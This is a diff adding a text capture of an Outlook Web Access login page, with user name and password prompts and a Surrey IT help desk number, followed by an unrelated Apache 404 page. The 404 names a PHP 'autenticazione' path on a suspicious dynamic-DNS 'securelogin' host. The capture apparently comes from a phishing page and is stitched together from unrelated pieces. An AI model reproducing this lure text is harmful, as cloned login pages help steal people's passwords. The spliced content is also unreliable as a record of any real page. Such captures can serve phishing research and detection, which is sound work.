@@ -1,0 +1,23 @@
+Microsoft Exchange - Outlook Web Access  Security ( show explanation )
+This is a public or shared computer
+This is a private computer
+Use Outlook Web Access Light
+The Light client provides fewer features and is sometimes faster. Use the Light client if you are on a slow connection or using a computer with unusually strict browser security settings. If you are using a browser other than Internet Explorer 6 or later, you can only use the Light client.
+User name:
+Password:
+
+
+
+
+
+
+
+
+Connected to Microsoft Exchange Server 022
+© 2007 Microsoft Corporation. All rights reserved.
+Visit the IT Services website for assistance or contact the IT User Support Desk on 01483 689898
+  If you have been migrated to Surrey365 please click here
+   text/html; CHARSET=utf-8 NOINDEX, NOFOLLOW
+404 Not FoundNot Found
+The requested URL /jod-fooos1/foo-autenticazione.php was not found on this server.
+Apache/2.4.7 (Ubuntu) Server at securelogin-poss3te-it-securrzza008-2017.dynamic-dns.net Port 80 
